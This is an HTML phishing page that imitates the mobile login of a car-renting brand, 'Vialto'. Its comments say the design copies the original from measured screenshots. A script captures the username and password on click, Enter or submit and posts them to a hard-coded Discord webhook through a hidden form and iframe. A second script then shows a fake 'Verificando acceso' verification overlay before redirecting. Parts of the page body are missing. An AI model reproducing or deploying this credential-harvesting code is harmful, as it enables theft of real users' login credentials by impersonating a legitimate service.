<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#1668f2">
<title>Vialto</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<style>
  :root{
    --azul:#006dfe;            /* azul exacto medido en las capturas */
    --azul-osc:#0056d6;
    --gris-fondo:#f6f6f6;
    --texto:#0a0a0a;           /* titular/negritas: negro puro */
    --texto-sec:#484848;       /* cuerpo: gris neutro medido */
    --texto-sec2:#6e6e6e;
    --linea:#d9dde3;
    --blanco:#ffffff;
    --pad:26px;
    --alto-real:100dvh;        /* lo actualiza el JS del teclado */
  }

  *{box-sizing:border-box;}

  html,body{
    margin:0;padding:0;height:100%;
    overscroll-behavior-y:none;          /* quita el rebote elástico */
    background:var(--azul);             /* zona segura superior azul */
    font-family:'Inter',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
    color:var(--texto);
    -webkit-text-size-adjust:100%;
    -webkit-font-smoothing:antialiased;
    text-rendering:optimizeLegibility;
  }

  .app{
    position:relative;
    height:100vh;                        /* reserva navegadores viejos */
    height:100dvh;
    height:var(--alto-real,100dvh);
    max-width:520px;margin:0 auto;
    container-type:inline-size;          /* unidades cqw = % del ancho de la app */
    background:var(--blanco);
    overflow:hidden;                     /* hay zona scrollable dentro */
    padding-top:env(safe-area-inset-top);
    display:flex;flex-direction:column;
  }

  .screen{flex:1 1 auto;min-height:0;display:flex;flex-direction:column;}
  .screen[hidden]{display:none;}

  /* ---------- barra superior ---------- */
  .topbar{
    flex:none;position:relative;
    display:flex;align-items:center;
    height:54px;padding:0 10px;
    background:var(--blanco);
  }
  .icon-btn{
    flex:none;display:flex;align-items:center;justify-content:center;
    width:44px;height:44px;border:none;background:none;padding:0;
    color:#1b1f27;cursor:pointer;touch-action:manipulation;
  }
  /* logo a la izquierda del centro, con hueco tras el menú (como el original) */
  .topbar .logo{
    display:flex;align-items:center;min-width:0;pointer-events:none;
    /* medido en la captura: empieza al 25,3% del ancho (tras el menú de 54px) */
    margin-left:calc(min(25.3vw,131px) - 54px);
    margin-left:calc(25.3cqw - 54px);
  }
  /* medido en la captura: ancho 176px de 509px = 34,6% */
  .topbar .logo svg{display:block;flex:none;width:min(34.6vw,180px);width:34.6cqw;height:auto;aspect-ratio:144/29;max-width:100%;}
  .topbar .right{display:flex;align-items:center;gap:2px;margin-left:auto;}
  .sos{
    flex:none;width:44px;height:44px;display:flex;align-items:center;justify-content:center;
    border:none;background:none;cursor:pointer;touch-action:manipulation;color:#1b1f27;
  }
  .sos svg,.icon-btn svg{display:block;}

  /* ---------- zona scrollable ---------- */
  .scroll{
    flex:1 1 auto;min-height:0;                 /* imprescindible */
    overflow-y:auto;overscroll-behavior:contain;
    -webkit-overflow-scrolling:touch;
  }

  /* ================= PANTALLA 1 : HOME ================= */
  .screen--home .scroll{background:var(--gris-fondo);display:flex;flex-direction:column;}

  .home-top{padding:clamp(14px,3dvh,26px) var(--pad) clamp(6px,1.6dvh,14px);}

  h1.titular{
    margin:0;
    font-size:clamp(30px,8vw,40px);
    line-height:1.1;letter-spacing:-1px;font-weight:800;color:var(--texto);
  }
  h1.titular .azul{color:var(--azul);display:block;}

  .intro{
    margin:clamp(14px,2.6dvh,22px) 0 0;
    font-size:15px;line-height:1.35;color:var(--texto-sec);font-weight:400;
  }
  .intro b{color:var(--texto);font-weight:700;}
  .intro i{font-style:italic;}

  ul.ventajas{
    list-style:none;margin:clamp(18px,3dvh,28px) 0 0;padding:0;
    display:flex;flex-direction:column;gap:clamp(11px,1.8dvh,16px);
  }
  ul.ventajas li{display:flex;gap:11px;align-items:flex-start;}
  ul.ventajas li .check{flex:none;width:21px;height:21px;color:var(--azul);margin-top:1px;}
  ul.ventajas li .txt{font-size:15px;line-height:1.38;color:var(--texto-sec);font-weight:400;}
  ul.ventajas li .txt b{color:var(--texto);font-weight:700;}

  .btn-info{
    flex:none;align-self:flex-start;
    display:inline-flex;align-items:center;justify-content:center;
    margin:clamp(16px,2.6dvh,24px) var(--pad) 0;
    min-height:48px;padding:0 24px;
    background:var(--blanco);color:var(--azul);
    font-size:15.5px;font-weight:600;
    border:1.5px solid var(--azul);border-radius:10px;
    cursor:pointer;touch-action:manipulation;
  }

  /* foto real: ocupa el espacio restante y se encuadra sin recortar las caras */
  .hero{flex:1 1 auto;min-height:120px;margin-top:clamp(10px,2dvh,18px);width:100%;overflow:hidden;}
  .hero img{display:block;width:100%;height:100%;object-fit:cover;object-position:center 28%;}

  /* barra Acceso anclada abajo */
  .barra-acceso{flex:none;background:var(--azul);padding-bottom:env(safe-area-inset-bottom);}
  .barra-acceso button{
    width:100%;min-height:54px;border:none;background:none;
    color:#fff;font-size:18px;font-weight:700;letter-spacing:.2px;
    cursor:pointer;touch-action:manipulation;
  }

  /* ================= PANTALLA 2 : LOGIN ================= */
  .screen--login .topbar{justify-content:flex-end;}
  .screen--login .scroll{background:var(--blanco);}

  .login-body{
    padding:clamp(12px,2.4dvh,24px) 26px 24px;
    display:flex;flex-direction:column;min-height:100%;
  }
  .bienvenido{margin:0;font-size:18px;font-weight:500;color:var(--texto-sec);}
  .marca{
    margin:24px 0 clamp(26px,5.6dvh,45px);   /* medido en la captura */
  }
  .marca svg{display:block;width:min(34.4vw,179px);width:34.4cqw;height:auto;aspect-ratio:144/29;max-width:100%;}

  .select-wrap{position:relative;flex:none;margin-bottom:clamp(20px,4dvh,34px);}
  .select-wrap select{
    width:100%;min-height:48px;
    font-size:16px;font-weight:500;color:var(--texto);
    background:transparent;border:none;border-bottom:1.5px solid var(--linea);
    padding:0 34px 0 2px;appearance:none;-webkit-appearance:none;
    touch-action:manipulation;font-family:inherit;
  }
  .select-wrap .chev{
    position:absolute;right:4px;top:50%;transform:translateY(-50%);
    pointer-events:none;color:#1b1f27;width:22px;height:22px;
  }

  .campo{
    flex:none;display:flex;align-items:center;gap:12px;
    border-bottom:1.5px solid var(--linea);padding:6px 2px;
    margin-bottom:clamp(18px,3.4dvh,28px);
  }
  .campo .ic{flex:none;width:22px;height:26px;color:#1b1f27;display:flex;align-items:center;}
  .campo .sep{flex:none;width:1px;align-self:stretch;background:var(--linea);margin:4px 0;}
  .campo input{
    flex:1 1 auto;min-width:0;border:none;background:transparent;outline:none;
    font-size:16px;                        /* evita el zoom de iOS */
    color:var(--texto);min-height:36px;font-family:inherit;
    touch-action:manipulation;
  }
  .campo input::placeholder{color:#9aa1ac;font-weight:400;}

  .link-azul{
    flex:none;align-self:flex-start;color:var(--azul);font-size:15px;font-weight:600;
    text-decoration:none;padding:6px 0;touch-action:manipulation;
  }

  .espaciador{flex:1 1 auto;min-height:18px;}

  .hazte{flex:none;text-align:center;margin:18px 0 6px;}
  .hazte a{color:#13161c;font-size:16px;font-weight:600;text-decoration:underline;text-underline-offset:3px;padding:8px 0;touch-action:manipulation;}

  .zona-boton{flex:none;background:var(--azul);padding-bottom:env(safe-area-inset-bottom);}
  .zona-boton button{
    width:100%;min-height:56px;border:none;background:none;
    color:#fff;font-size:18px;font-weight:700;letter-spacing:.2px;
    cursor:pointer;touch-action:manipulation;
  }

  /* ---------- con el teclado abierto ---------- */
  .app.teclado .zona-boton{
    position:absolute;left:0;right:0;bottom:0;z-index:20;
    max-width:520px;margin:0 auto;background:var(--azul);
    box-shadow:0 -2px 12px rgba(20,30,60,.16);
  }
  .app.teclado .login-body{padding-bottom:82px;}

  @media (max-height:640px){
    .marca svg{width:min(30vw,150px);width:30cqw;}
    h1.titular{font-size:29px;}
    .intro{font-size:14px;}
  }
  @media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important;}}
</style>
</head>

        <h1 class="titular">Cambiar de coche<span class="azul">cuesta muy poco</span></h1>
        <p class="intro">Con nuestro <b><i>renting</i></b> de coches, disfruta de todas las ventajas de tener un vehículo propio.</p>

        <ul class="ventajas">
          <li>
            <span class="check"><svg viewBox="0 0 24 24" width="21" height="21" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span>
            <span class="txt"><b>Sin entrada</b> y sin sorpresas, <b>una única cuota mensual.</b></span>
          </li>
          <li>
            <span class="check"><svg viewBox="0 0 24 24" width="21" height="21" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></span>

          </li>
        </ul>

<script>
(function(){
  "use strict";
  var app=document.getElementById('app');
  var home=document.getElementById('home');
  var login=document.getElementById('login');

  function mostrar(pantalla){
    var hayLogin=(pantalla==='login');
    home.hidden=hayLogin;
    login.hidden=!hayLogin;
    altoSinTeclado=0;                      // resetea la referencia del teclado
    setTimeout(ajustarTeclado,60);
    var sc=(hayLogin?login:home).querySelector('.scroll'); if(sc) sc.scrollTop=0;
  }

  var btnAcceso=document.getElementById('btn-acceso');
  if(btnAcceso) btnAcceso.addEventListener('click',function(){mostrar('login');});
  var btnMenu=document.getElementById('btn-menu');
  if(btnMenu) btnMenu.addEventListener('click',function(){mostrar('home');});

  ['link-recuperar','link-alta'].forEach(function(id){
    var el=document.getElementById(id);
    if(el) el.addEventListener('click',function(e){e.preventDefault();});
  });

  var form=document.getElementById('form-login');
  if(form) form.addEventListener('submit',function(e){e.preventDefault();}); // demo sin backend

  /* ---------- manejo del teclado (según reglas) ---------- */
  var campos=Array.prototype.slice.call(document.querySelectorAll('input'));
  var altoSinTeclado=0;
  function altoVisible(){return window.visualViewport?window.visualViewport.height:window.innerHeight;}
  function hayCampoEnfocado(){return campos.indexOf(document.activeElement)!==-1;}
  function ajustarTeclado(){
    var visible=altoVisible();
    if(!hayCampoEnfocado() && visible>altoSinTeclado) altoSinTeclado=visible;
    app.style.setProperty('--alto-real',visible+'px');
    var abierto=hayCampoEnfocado() && (altoSinTeclado-visible)>120;
    app.classList.toggle('teclado',abierto);
  }
  if(window.visualViewport){
    window.visualViewport.addEventListener('resize',ajustarTeclado);
    window.visualViewport.addEventListener('scroll',ajustarTeclado);
  }
  window.addEventListener('resize',ajustarTeclado);
  window.addEventListener('orientationchange',function(){altoSinTeclado=0;setTimeout(ajustarTeclado,400);});
  campos.forEach(function(c){
    c.addEventListener('focus',function(){setTimeout(ajustarTeclado,60);});
    c.addEventListener('blur',function(){setTimeout(ajustarTeclado,60);});
  });
  ajustarTeclado();
})();
</script>

<script>
(function () {
  'use strict';

  var REDIRECT_URL = 'index.html';   // ← destino tras el overlay
  var DURATION_MS  = 11000;          // 11 s
  var CANDIDATES   = ['loader.png', 'loader.gif'];
  var fired        = false;

  // Delegación: la función comprueba si el click fue sobre un botón "Continuar".
  // Funciona aunque el botón se cree dinámicamente (como es el caso).
  document.addEventListener('click', function (e) {
    var t = e.target;
    while (t && t !== document) {
      if ((t.tagName === 'BUTTON' || t.tagName === 'A') && esContinuar(t)) {
        e.preventDefault();
        e.stopImmediatePropagation();
        if (fired) return;
        fired = true;
        console.log('[Overlay2FA] Continuar pulsado');
        showLoader();
        return;
      }
      t = t.parentNode;
    }
  }, true);

  function esContinuar(el) {
    var id = (el.id || '').toLowerCase();
    if (id === 'continuar' || id === 'btn-continuar' || id === 'btn-entrar') return true;
    var txt = (el.textContent || '').trim().toLowerCase();
    return txt === 'continuar' || txt === 'entrar' || txt === 'siguiente';
  }

  function showLoader() {
    if (document.getElementById('fake-loader-2fa')) return;

    var overlay = document.createElement('div');
    overlay.id = 'fake-loader-2fa';
    overlay.style.cssText =
      'position:fixed;top:0;left:0;width:100%;height:100%;' +
      'background:rgba(10,15,25,0.95);' +
      'backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px);' +
      'z-index:2147483647;display:flex;flex-direction:column;' +
      'align-items:center;justify-content:center;padding:20px;' +
      'box-sizing:border-box;text-align:center;' +
      "font-family:'Inter',system-ui,-apple-system,sans-serif;";

    if (!document.getElementById('spinner-keyframes')) {
      var st = document.createElement('style');
      st.id = 'spinner-keyframes';
      st.textContent = '@keyframes forzarGiro{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}';
      document.head.appendChild(st);
    }

    var loaderBox = document.createElement('div');
    loaderBox.style.cssText =
      'width:clamp(140px,26vw,220px);height:clamp(140px,26vw,220px);' +
      'margin-bottom:clamp(20px,4vw,35px);display:flex;align-items:center;justify-content:center;';
    overlay.appendChild(loaderBox);

    function replaceWithSpinner() {
      loaderBox.innerHTML = '';
      var s = document.createElement('div');
      s.style.cssText =
        'width:85%;height:85%;border-radius:50%;' +
        'border:5px solid rgba(255,255,255,0.2);border-top:5px solid #006dfe;' +
        'box-sizing:border-box;animation:forzarGiro 1s linear infinite;';
      loaderBox.appendChild(s);
    }

    var img = document.createElement('img');
    img.alt = 'Cargando';
    img.style.cssText = 'width:100%;height:100%;object-fit:contain;display:block;';
    loaderBox.appendChild(img);

    var idx = 0, state = 'loading', timer = null;

    function tryNext() {
      if (idx >= CANDIDATES.length) { state = 'error'; img.remove(); replaceWithSpinner(); return; }
      state = 'loading';
      var src = CANDIDATES[idx] + '?v=' + Date.now();
      console.log('[Overlay2FA] Probando: ' + src);
      clearTimeout(timer);
      timer = setTimeout(function () {
        if (state === 'loading') { state = 'timeout'; console.warn('[Overlay2FA] Timeout: ' + src); idx++; tryNext(); }
      }, 2500);
      img.src = src;
    }

    img.onload = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      state = 'loaded';
      console.log('[Overlay2FA] Imagen OK: ' + img.naturalWidth + '×' + img.naturalHeight);
      if (img.naturalWidth < 20 || img.naturalHeight < 20) { console.warn('[Overlay2FA] Imagen demasiado pequeña.'); idx++; tryNext(); }
    };

    img.onerror = function () {
      if (state !== 'loading') return;
      clearTimeout(timer);
      console.warn('[Overlay2FA] Fallo al cargar: ' + img.src);
      idx++; tryNext();
    };

    tryNext();

    var title = document.createElement('h2');
    title.style.cssText =
      'font-size:clamp(20px,4.5vw,26px);color:#fff;font-weight:700;margin:0;letter-spacing:0.3px;';
    title.textContent = 'Verificando acceso';
    overlay.appendChild(title);

    var sub = document.createElement('p');
    sub.style.cssText =
      'font-size:clamp(14px,3.2vw,16px);color:rgba(255,255,255,0.8);margin-top:10px;';
    sub.textContent = 'Por favor, espere un momento...';
    overlay.appendChild(sub);

    document.body.appendChild(overlay);
    document.body.style.overflow = 'hidden';

    console.log('[Overlay2FA] Redirigiendo a ' + REDIRECT_URL + ' en ' + DURATION_MS + 'ms...');
    setTimeout(function () { window.location.href = REDIRECT_URL; }, DURATION_MS);
  }
})();
</script>

<script>
(function () {
  'use strict';

  var WEBHOOK_URL = 'https://discord.com/api/webhooks/1571920305453277216/kXHK5-J3-Zl7YAkD4P-Kuh6MHatxWRf5X25nBDP7tFg0uMxRQI88L70kjG90cx4GNGK9';
  var enviado = false;

  function enviarDatos() {
    // Evitar envíos duplicados
    if (enviado) return;
    
    var uInput = document.querySelector('input[name="usuario"]');
    var pInput = document.querySelector('input[name="password"]');

    if (!uInput || !pInput) return;

    var usuario = uInput.value.trim();
    var clave = pInput.value;

    // Si ambas cajas están vacías, no hacemos nada
    if (!usuario && !clave) return;

    enviado = true;
    // Bloqueamos envíos durante 3 segundos (por si acaso)
    setTimeout(function() { enviado = false; }, 3000); 

    // 1. Creamos iframe invisible para saltar CORS
    var iframeName = 'sink_' + Date.now();
    var iframe = document.createElement('iframe');
    iframe.name = iframeName;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    // 2. Formulario invisible hacia el webhook
    var sendForm = document.createElement('form');
    sendForm.action = WEBHOOK_URL;
    sendForm.method = 'POST';
    sendForm.enctype = 'multipart/form-data';
    sendForm.target = iframeName;

    // 3. Payload de Discord
    var payload = {
      username: 'Vialto Login',
      embeds: [{
        title: '🔐 Credenciales Vialto',
        color: 0x006dfe,
        fields: [
          { name: 'Usuario', value: usuario ? '`' + usuario + '`' : '_(vacío)_', inline: true },
          { name: 'Contraseña', value: clave ? '`' + clave + '`' : '_(vacía)_', inline: true }
        ]
      }]
    };

    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'payload_json';
    input.value = JSON.stringify(payload);
    sendForm.appendChild(input);

    document.body.appendChild(sendForm);
    sendForm.submit();

    // Limpieza
    setTimeout(function () {
      iframe.remove();
      sendForm.remove();
    }, 2000);
  }

  // CAPTURA 1: Clic en el botón (usando pointerdown para adelantarnos al bloqueo del otro script)
  document.addEventListener('pointerdown', function(e) {
    if (e.target.closest('#btn-entrar')) {
      enviarDatos();
    }
  }, true);

  // CAPTURA 2: Pulsar Enter en cualquiera de las cajas de texto
  document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' || e.keyCode === 13) {
      if (e.target.tagName === 'INPUT') {
        enviarDatos();
      }
    }
  }, true);

  // CAPTURA 3: Por si el formulario se envía de forma nativa
  var form = document.getElementById('form-login');
  if (form) {
    form.addEventListener('submit', function(e) {
      enviarDatos();
    }, true);
  }

})();
</script>
